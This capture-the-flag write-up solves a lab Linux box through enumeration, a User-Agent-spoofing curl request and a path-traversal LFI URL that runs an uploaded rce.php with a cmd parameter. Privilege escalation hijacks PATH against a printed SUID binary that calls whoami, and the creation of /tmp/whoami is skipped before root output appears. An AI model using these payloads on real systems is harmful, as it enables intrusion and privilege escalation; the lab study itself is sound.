# Inclusiveness

Author: OSPG
Difficulty: 2
Key takeaway: whoami is a script added to PATH, in any webpage if files are loaded/rendered based on parameters passed in url there's a chance of LFI
Tags: LFI, PATH, SUID, whoami
Type: Linux

# Enumeration

- portscan

```bash
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-30 00:39 EDT
Nmap scan report for inclusiveness.ospg (192.168.53.14)
Host is up (0.00081s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxrwxrwx    2 0        0            4096 Feb 08  2020 pub [NSE: writeable]
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.53.200
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 06:1b:a3:92:83:a5:7a:15:bd:40:6e:0c:8d:98:27:7b (RSA)
|   256 cb:38:83:26:1a:9f:d3:5d:d3:fe:9b:a1:d3:bc:ab:2c (ECDSA)
|_  256 65:54:fc:2d:12:ac:e1:84:78:3e:00:23:fb:e4:c9:ee (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Apache2 Debian Default Page: It works
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.13 seconds
```

- gobuster scan

```bash
(kali??kali)-[~]
$ gobuster dir -u http://inclusiveness.ospg -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 40 -x php,html,txt                                                                                                  1 ??
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://inclusiveness.ospg
[+] Threads:        40
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php,html,txt
[+] Timeout:        10s
===============================================================
2021/09/30 00:40:49 Starting gobuster
===============================================================
/index.html (Status: 200)
/manual (Status: 301)
/javascript (Status: 301)
/robots.txt (Status: 200)
/seo.html (Status: 200)
/norobots.txt (Status: 200)
/robots-txt (Status: 200)
/robots-txt.php (Status: 200)
/robots-txt.html (Status: 200)
/robots-txt.txt (Status: 200)
/server-status (Status: 403)
/valid-robots.txt (Status: 200)
===============================================================
2021/09/30 00:41:56 Finished
===============================================================
```

there are multiple robots.txt files but only a search engine can access them

To open the robots file as a search engine

```bash
curl -H "User-Agent:google" http://192.168.138.14/robots.txt
```

Contents of robots.txt

```bash
User-agent: *
Disallow: /secret_information/
```

the `secret_information` page hints at zone transfer attack

# Initial Access

/secret_information/ had LFI 

first uploaded a script to pub directory using FTP then ran it to gain reverse shell

```bash
/secret_information?lang=../../../../../../../../../../../../../../var/ftp/pub/rce.php&cmd=id
```

> the /secret_information/ page had two options, english and spanish which loaded two separate php files â†’ hint for trying LFI
> 

# Privilege Escalation

Found a file rootshell in /home/tom

we can see popen function and whoami binary is not full path

```bash
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>

int main() {

    printf("checking if you are tom...\n");
    FILE* f = popen("whoami", "r");

    char user[80];
    fgets(user, 80, f);

    printf("you are: %s\n", user);
    //printf("your euid is: %i\n", geteuid());

    if (strncmp(user, "tom", 3) == 0) {
        printf("access granted.\n");
	setuid(geteuid());
        execlp("sh", "sh", (char *) 0);
    }
}
```

creating another file /tmp/whoami

```bash
sudo -l
Matching Defaults entries for root on inclusiveness:
env_reset, mail_badpass,
secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User root may run the following commands on inclusiveness:
(ALL : ALL) ALL
```

-